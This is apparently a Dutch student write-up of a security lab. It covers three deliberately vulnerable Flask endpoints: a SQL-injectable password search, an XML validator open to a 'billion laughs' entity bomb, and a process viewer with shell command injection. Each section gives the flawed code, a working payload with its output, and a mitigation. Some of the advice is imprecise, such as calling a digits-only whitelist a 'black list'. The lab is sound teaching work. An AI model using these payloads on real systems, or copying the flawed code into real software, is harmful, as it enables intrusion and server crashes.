# Lesson 4

## Weak Passwords

```python
@app.route('/weakpassword')
def weakpassword():
    return render_template('weakpassword.html',searchresult = [], query = '')

@app.route('/weakpasswordsearch')
def weakpasswordsearch():
    conn = sqlite3.connect('passwords.db')
    result = []
    query = str(request.args.get('query'))
    
    if len(query) > 2:
        try:            
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM passwords WHERE" +
             "((password LIKE '%%%s' ) OR (password LIKE '%s%%')) LIMIT 20"
                % (query,query))          
            rows = cursor.fetchall()       
            for row in rows:
                print(row,file=sys.stderr)
                result.append(row[0])        
        except:
            result = []
    
    conn.close()
    return render_template('weakpassword.html',searchresult = result, query=query)
```

### Problem
Het probleem bevindt zicht in de SQL statement. De cursor die de SQL uitvoert wordt op hetzelfde moment gevuld met data uit de gebruikersomgeving, zonder dat deze gechtecht word.

### Evidence
Bij het uitvoeren van het volgende commando zal de server dit stuk SQL in de query injecteren.
```
http GET localhost:5000/weakpasswordsearch query=="'OR'--"
```
Response:
```html
<h3>Search result for: &#39;OR&#39;1=1--</h3>
<ol>
<li>123456<br>
<li>password<br>
<li>12345678<br>
<li>qwerty<br>
<li>123456789<br>
<li>12345<br>
<li>1234<br>
<li>111111<br>
<li>1234567<br>
<li>dragon<br>   
<li>123123<br>
<li>baseball<br>  
<li>abc123<br>
<li>football<br>         
<li>monkey<br>
<li>letmein<br>
<li>696969<br>
<li>shadow<br>
<li>master<br>
<li>666666<br>
</ol>
```
Hier is te zien dat er arbitraire SQL in uitgevoerd.

### Mitigation
Er had hier input encoding kunnen plaatsvinden waardoor dingen zoals ```'``` geëscaped worden in plaats van in de code terecht komen.

## B2B
```python
@app.route('/b2b', methods=['GET','POST'])
def b2b():
    if request.method == 'GET':
        return render_template('b2b.html', verificationresult = '')
    if request.method == 'POST':
        try:
            schema = xmlschema.XMLSchema('static/note.xsd')
        except:
            return render_template('b2b.html',
                verificationresult =
                    'Internal problem while loading XML schema. Please contact administration')

        result = "The file is not valid"
        
        try:
            file = request.files['file']
        except:
            file = None

        if file and file.filename.endswith('.xml'):
            if schema.is_valid(file.read().decode('utf-8')):
                result = "The document is valid"
        else:
            file = None

        return render_template('b2b.html', verificationresult = result)
```
### Problem
Bij dit voorbeeld is het probleem dat er XML elementen kunnen worden gebombardeerd. Deze instelling staat niet uit op de XML parser.

### Evidence

Bij het onderstaande XML object is er een "billion laughs" aanval in het bestand geïnjecteerd.

```xml
<?xml version="1.0"?>
<!DOCTYPE body [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>&lol9;</body>
</note>
```

Na het opsturen van dit bestand crasht de webserver.

### Mitigation
De oplossing is echter heel simpel. De XML parser zou de optie moeten uitschakelen waarin elementen worden overgenomen door middel van referenties. Op deze manier worden dingen zoals ```&lol9;``` niet ingevuld.

## Process Viewer

```python
@app.route('/status')
def status():
    processes = json.loads(subprocess.check_output("/bin/ps aux | /usr/bin/awk -v OFS=,
        '{print $1, $2, $3}' |  /usr/bin/jq -R 'split(\",\") | 
            {user: .[0], pid: .[1], cpu: .[2]}' | /usr/bin/jq -s .",
                shell=True))
    selection = []
    processes.pop(0)
    for proc in processes:
        if float(proc['cpu']) > 0:
            selection.append(proc)
    return render_template('status.html', processes = selection)

@app.route('/details', methods=['POST'])
def defauls():
    pid = str(request.form.get('pid'))
    try:
        processes = json.loads(
            subprocess.check_output("/bin/ps -p %s | /usr/bin/awk -v OFS=, 
                '{print $1, $3, $4}' |  /usr/bin/jq -R 'split(\",\") |
                {pid: .[0], time: .[1], command: .[2]}' | /usr/bin/jq -s ." 
                    % (pid) ,shell=True))
        processes.pop(0)
        return render_template('details.html', processes = processes)
    except:
        processes = json.loads(subprocess.check_output("/bin/ps aux | /usr/bin/awk -v OFS=, '{print $1, $2, $3}' |  /usr/bin/jq -R 'split(\",\") | {user: .[0], pid: .[1], cpu: .[2]}' | /usr/bin/jq -s .",shell=True))
        selection = []
        processes.pop(0)
        for proc in processes:
            if float(proc['cpu']) > 0:
                selection.append(proc)
        return render_template('status.html', processes = selection)
```

### Problem
Bij deze code is er iets soortgelijks aan de hand als bij de SQL injectie. Het is mogelijk om arbitraire code te executen op een linux systeem.

### Evidence
Hierbij is het mogelijk om het ```ls``` commando uit te voeren op de web server.
```
http -f POST localhost:5000/details pid=";ls"
```
```html
HTTP/1.0 200 OK
Content-Length: 367
Content-Type: text/html; charset=utf-8
Date: Mon, 07 Dec 2020 22:48:31 GMT
Server: Werkzeug/1.0.1 Python/3.7.9

<h1>Active processes</h1>
<P>Process details</p>

<table border=1>
<tr><td>PID</td><td>TIME</td><td>Command</td></tr>

<tr><td>app.py</td><td></td><td></td></tr>

<tr><td>passwords.db</td><td></td><td></td></tr>

<tr><td>requirements.txt</td><td></td><td></td></tr>

<tr><td>static</td><td></td><td></td></tr>

<tr><td>templates</td><td></td><td></td></tr>

</table>
```

Dit is niet heel erg maar een tegenstander zou bijvoorbeeld een commando als dit kunnen uitvoeren:
```
echo "SSH config payload" > /etc/ssh.conf
```
Hierdoor is het mogelijk om remote access te krijgen tot de server.

### Mitigation
Hier zou een black list input validatie genoeg zijn om dit probleem te verhelpen. Als de gebruiker alleen input kan invoeren wat bestaat uit een getal tussen ```0``` en ```9```, of een combinatie van getallen tussen ```0``` en ```9``` kan de gebruiker alleen maar een process ```id``` kunnen invullen.